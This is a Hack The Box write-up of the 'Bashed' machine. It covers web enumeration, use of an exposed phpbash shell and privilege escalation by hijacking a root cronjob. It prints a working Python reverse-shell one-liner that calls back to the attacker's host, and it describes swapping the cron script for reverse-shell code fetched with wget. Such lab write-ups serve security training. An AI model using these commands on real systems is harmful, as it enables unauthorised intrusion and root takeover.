---
title: "[HTB] Bashed"
author: "Wook Lee"
date: "2024-08-09"
tags: ["Hack The Box"]
---

![alt text](image.png#center)
nmap scan found that there is one open port, which is the port 80

<br>

![alt text](image-1.png#center)
Since it was a **_http_** server, I navigated to the web page of target ip address.

<br>

![alt text](image-2.png#center)
I didn't find much interesting information on the web page, so I decided to gather more by using **_gobuster_** with the following command:

`gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt`

<br>

![alt text](image-3.png#center)
**gobuster** found many interesting directories, but the directory, **_/dev_** caught my eye because it included this file **_phpbash.php_** where I could run some bash commands.

<br>

![alt text](image-4.png#center)
obtaining the **_user flag_** wasn't that hard since I found the **_phpbash_**. I just had to navigate to the proper user directory.

<br>

![alt text](image-13.png#center)
The problem was gaining the **_root_** user access. You guessed it. Time for **_privilege escalation_**.

<br>

`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.51",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`

The **_phpbash_** was very useful but it was very limited. Therefore, I decided to pop a **_reverse shell_** using the python command above.

<br>

![alt text](image-14.png#center)
successfully popped the reverse shell.

<br>

![alt text](image-15.png#center)
The `sudo -l` command display a list of commands you are allowed to run with `sudo`.

`(scriptmanager : scriptmanager)` means the user can run `ALL` commands as the user, **_scriptmanager_**.

<br>

![alt text](image-16.png#center)
after gaining the `scriptmanager` user shell by running `sudo -u scriptmanager /bin/bash` command, I explored the directories. I found a suspicious directory, **_/scripts_**, there were two files inside it. One is **test.py** and the other is **_test.txt_**. As you could see from the screenshot above, the former is owned by **_scriptmanager_** and the latter is owned by **_root_**.

The content of the **_test.py_** is a python program that writes into **_test.txt_** file. Also as you could see from the screenshot above, the date format of the **_test.txt_** file is a bit different from the **_test.py_** file.

<br>

![alt text](image-17.png#center)
running another `ls -la` command confirmed that my suspicious was true. There exists a **_cronjob_** that is scheduled to execute the **_test.py_** file and write to the **_test.txt_** file.

**_cronjob_** is a scheduled task in Unix-like operating systems that is executed automatically at specified intervals. It is widely used for automating repetitive tasks, such as system maintenance, backups, updates, or running scripts.

<br>

![alt text](image-31.png#center)
Since I know there exists a cronjob that executes the **_test.py_** file, I can replace the file with a **_python reverse shell_** code with the same file name. The screenshot above is the code. It is the exact same code I previously had used except I changed the port to 2222 since I was already using the port 1234 to pop the original reverse shell.

<br>

![alt text](image-29.png#center)
It's important not to forget to make the file executable.

<br>

![alt text](image-19.png#center)
The command starts a simple http server in the directory where the command is executed. This means that any files in that directory will be accessible over HTTP.

<br>

![alt text](image-20.png#center)
Back to the **scriptmanager** shell, I removed the original **_test.py_** file to replace it over with my file that contains the reverse shell code.

<br>

![alt text](image-30.png#center)
Transferred the file over using the `wget` command.

<br>

![alt text](image-32.png#center)
Within a minute (because the cronjob is set to run every minute), I was connected to the root shell and captured the root flag.

<br>

![alt text](image-33.png#center)

<br>
